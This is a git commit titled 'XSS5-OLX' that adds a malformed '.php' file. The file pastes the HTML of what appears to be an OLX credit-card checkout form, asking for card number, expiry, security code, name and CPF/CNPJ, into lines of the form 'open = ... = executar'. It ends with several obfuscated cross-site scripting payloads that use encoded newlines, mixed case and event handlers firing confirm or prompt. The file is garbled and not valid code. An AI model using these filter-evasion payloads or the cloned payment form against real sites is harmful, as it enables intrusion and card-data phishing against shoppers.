e9eb12eb5a07cafb43f061a36a9ad364b06471f8
Matheus Maia <105084847+Anonimo055x@users.noreply.github.com>
2022-06-06 04:37:57 +0000

    XSS5-OLX

---
+++ .php
@@ -0,0 +1,83 @@
+<php><html><head><meta
+open = <button type="text" data-testid="PaymentSummary-confirm" class="sc-kGXeez hdBgtW sc-1tfw49k-3 OyKbc">Confirmar Pagamento</button> = executar
+open = <div class="sc-cJOK ctVhvJ"><div style="margin-left: -15px; margin-right: -15px; display: flex; flex-wrap: wrap; flex-grow: 0; flex-shrink: 0; align-items: normal; justify-content: flex-start;"><div style="box-sizing: border-box; min-height: 1px; position: relative; padding-left: 15px; padding-right: 15px; flex: 1 0 0px; max-width: 100%; margin-left: 0%; right: auto; left: auto;"><div style="top: 40px;" class="sc-ecaExY bCXQPZ"><a href="#0" data-tip="true" data-border="true" data-border-color="#333333" data-text-color="#333333" data-background-color="#ffffff" data-offset="{'top': 2}" data-for="cardsTooltip_tooltip" data-event="mouseover" data-event-off="mouseout" currentitem="false"><span alt="question-mark" class="sc-elNKlv izqbsC"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 20 20"><path fill="#9027B0" fill-rule="nonzero" d="M.5 10c0 5.246 4.254 9.5 9.5 9.5s9.5-4.254 9.5-9.5S15.246.5 10 .5.5 4.754.5 10zm18 0c0 4.693-3.807 8.5-8.5 8.5A8.501 8.501 0 0 1 1.5 10c0-4.693 3.807-8.5 8.5-8.5s8.5 3.807 8.5 8.5zm-9 3h1v1h-1v-1zM8.185 6.559c.457-.486 1.083-.729 1.88-.729.737 0 1.327.208 1.77.623.443.416.665.948.665 1.593 0 .392-.08.71-.24.954-.161.243-.49.602-.989 1.075-.362.343-.598.634-.707.873-.11.237-.164.59-.164 1.055h-.987c0-.528.063-.953.188-1.277.126-.323.405-.693.839-1.111l.452-.438a1.89 1.89 0 0 0 .33-.393 1.428 1.428 0 0 0-.101-1.69c-.22-.266-.586-.4-1.095-.4-.63 0-1.066.23-1.307.688-.136.254-.213.622-.232 1.102H7.5c0-.797.23-1.44.685-1.925z"></path></svg></span></a></div><div class="__react_component_tooltip t0e61b8f0-2cd3-4eb1-b736-7f8bd5676ad4 place-top type-dark" id="cardsTooltip_tooltip" data-id="tooltip"><style> = executar
+  	.t0e61b8f0-2cd3-4eb1-b736-7f8bd5676ad4 {
+	    color: #fff;
+	    background: #222;
+	    border: 1px solid transparent;
+  	}
+
+  	.t0e61b8f0-2cd3-4eb1-b736-7f8bd5676ad4.place-top {
+        margin-top: -10px;
+    }
+    .t0e61b8f0-2cd3-4eb1-b736-7f8bd5676ad4.place-top::before {
+        border-top: 8px solid transparent;
+    }
+    .t0e61b8f0-2cd3-4eb1-b736-7f8bd5676ad4.place-top::after {
+        border-left: 8px solid transparent;
+        border-right: 8px solid transparent;
+        bottom: -6px;
+        left: 50%;
+        margin-left: -8px;
+        border-top-color: #222;
+        border-top-style: solid;
+        border-top-width: 6px;
+    }
+
+    .t0e61b8f0-2cd3-4eb1-b736-7f8bd5676ad4.place-bottom {
+        margin-top: 10px;
+    }
+    .t0e61b8f0-2cd3-4eb1-b736-7f8bd5676ad4.place-bottom::before {
+        border-bottom: 8px solid transparent;
+    }
+    .t0e61b8f0-2cd3-4eb1-b736-7f8bd5676ad4.place-bottom::after {
+        border-left: 8px solid transparent;
+        border-right: 8px solid transparent;
+        top: -6px;
+        left: 50%;
+        margin-left: -8px;
+        border-bottom-color: #222;
+        border-bottom-style: solid;
+        border-bottom-width: 6px;
+    }
+
+    .t0e61b8f0-2cd3-4eb1-b736-7f8bd5676ad4.place-left {
+        margin-left: -10px;
+    }
+    .t0e61b8f0-2cd3-4eb1-b736-7f8bd5676ad4.place-left::before {
+        border-left: 8px solid transparent;
+    }
+    .t0e61b8f0-2cd3-4eb1-b736-7f8bd5676ad4.place-left::after {
+        border-top: 5px solid transparent;
+        border-bottom: 5px solid transparent;
+        right: -6px;
+        top: 50%;
+        margin-top: -4px;
+        border-left-color: #222;
+        border-left-style: solid;
+        border-left-width: 6px;
+    }
+
+    .t0e61b8f0-2cd3-4eb1-b736-7f8bd5676ad4.place-right {
+        margin-left: 10px;
+    }
+    .t0e61b8f0-2cd3-4eb1-b736-7f8bd5676ad4.place-right::before {
+        border-right: 8px solid transparent;
+    }
+    .t0e61b8f0-2cd3-4eb1-b736-7f8bd5676ad4.place-right::after {
+        border-top: 5px solid transparent;
+        border-bottom: 5px solid transparent;
+        left: -6px;
+        top: 50%;
+        margin-top: -4px;
+        border-right-color: #222;
+        border-right-style: solid;
+        border-right-width: 6px;
+    }
+open = </style><div class="sc-jKmXuR eQSBOD"><div style="margin-left: -15px; margin-right: -15px; display: flex; flex-wrap: wrap; flex-grow: 0; flex-shrink: 0; align-items: normal; justify-content: flex-start;"><div style="box-sizing: border-box; min-height: 1px; position: relative; padding-left: 15px; padding-right: 15px; flex: 1 0 0px; max-width: 100%; margin-left: 0%; right: auto; left: auto;"><div class="sc-cJOK bqjGmp"><span color="dark" font-weight="400" class="sc-bdVaJa hYhJJh">Cartões aceitos</span></div></div></div><div style="margin-left: -15px; margin-right: -15px; display: flex; flex-wrap: wrap; flex-grow: 0; flex-shrink: 0; align-items: normal; justify-content: flex-start;"><div style="box-sizing: border-box; min-height: 1px; position: relative; padding-left: 15px; padding-right: 15px; flex: 1 0 0px; max-width: 100%; margin-left: 0%; right: auto; left: auto;"><div class="sc-cJOK jRmuoN"><span color="dark" font-weight="400" class="sc-bdVaJa bxVNCd">Mastercard, Visa, Amex, Diners, Elo, Hiper, Hipercard, JCB e Débito Virtual Caixa</span></div></div></div></div></div><div class="sc-jTzLTM iwtnNi sc-bbmXgH POIpF"><div class="sc-jTzLTM iwtnNi sc-fYxtnH bUwevg"><span color="dark" font-weight="400" class="sc-bdVaJa hYhJJh">Número do cartão</span><div class="sc-jTzLTM iwtnNi sc-tilXH fGGaOW"><span color="grayscale.darker" font-weight="400" class="sc-bdVaJa bOgwhw"></span></div></div><div class="sc-jTzLTM iwtnNi sc-uJMKN gwCLbA"></div><div class="sc-brqgnP kQfOPE"><div class="sc-eHgmQL bggiDC"><svg viewBox="0 0 24 24" width="16" height="16" size="16" color="#4F4F4F"><path fill="#4F4F4F" fill-rule="evenodd" d="M22.25 9.25V6c0-.69-.56-1.25-1.25-1.25H3c-.69 0-1.25.56-1.25 1.25v3.25h20.5zm0 1.5H1.75V18c0 .69.56 1.25 1.25 1.25h18c.69 0 1.25-.56 1.25-1.25v-7.25zM3 3.25h18A2.75 2.75 0 0123.75 6v12A2.75 2.75 0 0121 20.75H3A2.75 2.75 0 01.25 18V6A2.75 2.75 0 013 3.25z"></path></svg></div><input type="text" maxlength="255" class="sc-jWBwVP dRWrJN sc-cMljjf eiNXFk" value=""></div><div class="sc-jTzLTM iwtnNi sc-gGBfsJ hnqXgg"></div></div></div></div><div style="margin-left: -15px; margin-right: -15px; display: flex; flex-wrap: wrap; flex-grow: 0; flex-shrink: 0; align-items: normal; justify-content: flex-start;"><div style="box-sizing: border-box; min-height: 1px; position: relative; padding-left: 15px; padding-right: 15px; flex: 0 0 50%; max-width: 50%; margin-left: 0%; right: auto; left: auto;"><div class="sc-jTzLTM iwtnNi sc-bbmXgH POIpF"><div class="sc-jTzLTM iwtnNi sc-fYxtnH bUwevg"><span color="dark" font-weight="400" class="sc-bdVaJa hYhJJh">Validade</span><div class="sc-jTzLTM iwtnNi sc-tilXH fGGaOW"><span color="grayscale.darker" font-weight="400" class="sc-bdVaJa bOgwhw"></span></div></div><div class="sc-jTzLTM iwtnNi sc-uJMKN gwCLbA"></div><div class="sc-brqgnP kQfOPE"><div class="sc-eHgmQL bggiDC"><svg viewBox="0 0 24 24" width="16" height="16" size="16" color="#4F4F4F"><path fill="#4F4F4F" fill-rule="evenodd" d="M20.25 9.25V6c0-.69-.56-1.25-1.25-1.25h-2.25V6a.75.75 0 11-1.5 0V4.75h-6.5V6a.75.75 0 01-1.5 0V4.75H5c-.69 0-1.25.56-1.25 1.25v3.25h16.5zm0 1.5H3.75V20c0 .69.56 1.25 1.25 1.25h14c.69 0 1.25-.56 1.25-1.25v-9.25zm-11.5-7.5h6.5V2a.75.75 0 111.5 0v1.25H19A2.75 2.75 0 0121.75 6v14A2.75 2.75 0 0119 22.75H5A2.75 2.75 0 012.25 20V6A2.75 2.75 0 015 3.25h2.25V2a.75.75 0 011.5 0v1.25z"></path></svg></div><input type="text" maxlength="5" class="sc-jWBwVP dRWrJN sc-cMljjf eiNXFk" placeholder="MM/AA" value=""></div><div class="sc-jTzLTM iwtnNi sc-gGBfsJ hnqXgg"></div></div></div><div style="box-sizing: border-box; min-height: 1px; position: relative; padding-left: 15px; padding-right: 15px; flex: 0 0 50%; max-width: 50%; margin-left: 0%; right: auto; left: auto;"><div width="100%" display="flex" class="sc-jKmXuR bccVuc"><div class="sc-jTzLTM iwtnNi sc-bbmXgH POIpF"><div class="sc-jTzLTM iwtnNi sc-fYxtnH bUwevg"><span color="dark" font-weight="400" class="sc-bdVaJa hYhJJh">Código de segurança</span><div class="sc-jTzLTM iwtnNi sc-tilXH fGGaOW"><span color="grayscale.darker" font-weight="400" class="sc-bdVaJa bOgwhw"></span></div></div><div class="sc-jTzLTM iwtnNi sc-uJMKN gwCLbA"></div><div class="sc-brqgnP kQfOPE"><div class="sc-eHgmQL bggiDC"><svg viewBox="0 0 24 24" width="16" height="16" size="16" color="#4F4F4F"><path fill="#4F4F4F" fill-rule="evenodd" d="M6.25 10.25V7a5.75 5.75 0 0111.5 0v3.25H19A2.75 2.75 0 0121.75 13v7A2.75 2.75 0 0119 22.75H5A2.75 2.75 0 012.25 20v-7A2.75 2.75 0 015 10.25h1.25zm1.5 0h8.5V7a4.25 4.25 0 10-8.5 0v3.25zM5 11.75c-.69 0-1.25.56-1.25 1.25v7c0 .69.56 1.25 1.25 1.25h14c.69 0 1.25-.56 1.25-1.25v-7c0-.69-.56-1.25-1.25-1.25H5z"></path></svg></div><input type="text" maxlength="3" class="sc-jWBwVP dRWrJN sc-cMljjf eiNXFk" value=""></div><div class="sc-jTzLTM iwtnNi sc-gGBfsJ hnqXgg"></div></div><div class="sc-cJOK btpHTU"><span alt="question-mark" class="sc-elNKlv iwYWiK"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 20 20"><path fill="#9027B0" fill-rule="nonzero" d="M.5 10c0 5.246 4.254 9.5 9.5 9.5s9.5-4.254 9.5-9.5S15.246.5 10 .5.5 4.754.5 10zm18 0c0 4.693-3.807 8.5-8.5 8.5A8.501 8.501 0 0 1 1.5 10c0-4.693 3.807-8.5 8.5-8.5s8.5 3.807 8.5 8.5zm-9 3h1v1h-1v-1zM8.185 6.559c.457-.486 1.083-.729 1.88-.729.737 0 1.327.208 1.77.623.443.416.665.948.665 1.593 0 .392-.08.71-.24.954-.161.243-.49.602-.989 1.075-.362.343-.598.634-.707.873-.11.237-.164.59-.164 1.055h-.987c0-.528.063-.953.188-1.277.126-.323.405-.693.839-1.111l.452-.438a1.89 1.89 0 0 0 .33-.393 1.428 1.428 0 0 0-.101-1.69c-.22-.266-.586-.4-1.095-.4-.63 0-1.066.23-1.307.688-.136.254-.213.622-.232 1.102H7.5c0-.797.23-1.44.685-1.925z"></path></svg></span></div></div></div></div><div style="margin-left: -15px; margin-right: -15px; display: flex; flex-wrap: wrap; flex-grow: 0; flex-shrink: 0; align-items: normal; justify-content: flex-start;"><div style="box-sizing: border-box; min-height: 1px; position: relative; padding-left: 15px; padding-right: 15px; flex: 1 0 0px; max-width: 100%; margin-left: 0%; right: auto; left: auto;"><div class="sc-jTzLTM iwtnNi sc-bbmXgH POIpF"><div class="sc-jTzLTM iwtnNi sc-fYxtnH bUwevg"><span color="dark" font-weight="400" class="sc-bdVaJa hYhJJh">Nome Impresso no Cartão</span><div class="sc-jTzLTM iwtnNi sc-tilXH fGGaOW"><span color="grayscale.darker" font-weight="400" class="sc-bdVaJa bOgwhw"></span></div></div><div class="sc-jTzLTM iwtnNi sc-uJMKN gwCLbA"></div><div class="sc-brqgnP HzdZd"><input type="text" maxlength="255" class="sc-jWBwVP dRWrJN sc-cMljjf eiNXFk" value=""></div><div class="sc-jTzLTM iwtnNi sc-gGBfsJ hnqXgg"></div></div></div></div><div style="margin-left: -15px; margin-right: -15px; display: flex; flex-wrap: wrap; flex-grow: 0; flex-shrink: 0; align-items: normal; justify-content: flex-start;"><div style="box-sizing: border-box; min-height: 1px; position: relative; padding-left: 15px; padding-right: 15px; flex: 1 0 0px; max-width: 100%; margin-left: 0%; right: auto; left: auto;"><div class="sc-jTzLTM iwtnNi sc-bbmXgH POIpF"><div class="sc-jTzLTM iwtnNi sc-fYxtnH bUwevg"><span color="dark" font-weight="400" class="sc-bdVaJa hYhJJh">CPF/CNPJ do titular</span><div class="sc-jTzLTM iwtnNi sc-tilXH fGGaOW"><span color="grayscale.darker" font-weight="400" class="sc-bdVaJa bOgwhw"></span></div></div><div class="sc-jTzLTM iwtnNi sc-uJMKN gwCLbA"></div><div class="sc-brqgnP HzdZd"><input type="text" maxlength="255" class="sc-jWBwVP dRWrJN sc-cMljjf eiNXFk" value=""></div><div class="sc-jTzLTM iwtnNi sc-gGBfsJ hnqXgg"></div></div></div></div><div style="margin-left: -15px; margin-right: -15px; display: flex; flex-wrap: wrap; flex-grow: 0; flex-shrink: 0; align-items: normal; justify-content: flex-start;"><div style="box-sizing: border-box; min-height: 1px; position: relative; padding-left: 15px; padding-right: 15px; flex: 1 0 0px; max-width: 100%; margin-left: 0%; right: auto; left: auto;"><div class="sc-cJOK gLlgAw"><div width="100%" display="flex" class="sc-jKmXuR iJCuwz"><div class="sc-cJOK ftWEtS"><svg viewBox="0 0 24 24" width="26" height="26" size="26" color="#4F4F4F"><path fill="#4F4F4F" fill-rule="evenodd" d="M6.25 10.25V7a5.75 5.75 0 0111.5 0v3.25H19A2.75 2.75 0 0121.75 13v7A2.75 2.75 0 0119 22.75H5A2.75 2.75 0 012.25 20v-7A2.75 2.75 0 015 10.25h1.25zm1.5 0h8.5V7a4.25 4.25 0 10-8.5 0v3.25zM5 11.75c-.69 0-1.25.56-1.25 1.25v7c0 .69.56 1.25 1.25 1.25h14c.69 0 1.25-.56 1.25-1.25v-7c0-.69-.56-1.25-1.25-1.25H5z"></path></svg></div><div width="100%" class="sc-cJOK jRmuoN"><span style="width: 100px;" color="dark" font-weight="400" class="sc-bdVaJa bxVNCd">Seu cartão de crédito ficará salvo para os próximos pagamentos</span></div></div></div></div></div><div style="margin-left: -15px; margin-right: -15px; display: flex; flex-wrap: wrap; flex-grow: 0; flex-shrink: 0; align-items: normal; justify-content: flex-start;"><div style="box-sizing: border-box; min-height: 1px; position: relative; padding-left: 15px; padding-right: 15px; flex: 1 0 0px; max-width: 100%; margin-left: 0%; right: auto; left: auto;"><div display="flex" class="sc-jKmXuR hUgtl"><div class="sc-cJOK dzcyVZ"><a href="" target="" class="sc-bYwvMP iSOMFy"><span color="purple" font-weight="400" class="sc-bdVaJa jUZaJa">Cancelar</span></a></div><div class="sc-jKmXuR cwbQAl"><button type="text" class="sc-kGXeez hdBgtW sc-ccSCjj bdztQB">Próximo</button></div></div></div></div></div> = executar
+open = <button type="text" data-testid="CheckoutModal-submit" class="sc-kGXeez cVvyrS sc-dif9zk-4 hwtpGi">Finalizar</button> = executar
+open = }]};(confirm)()//\ = executar
+open = <A%0aONMouseOvER%0d=%0d[8].find(confirm)>z = executar
+open = </tiTlE/><a%0donpOintErentER%0d=%0d(prompt)``>z = executar
+open = </SCRiPT/><DETAILs/+/onpoINTERenTEr%0a=%0aa=prompt,a()// = executar
+</script></body></html></php>
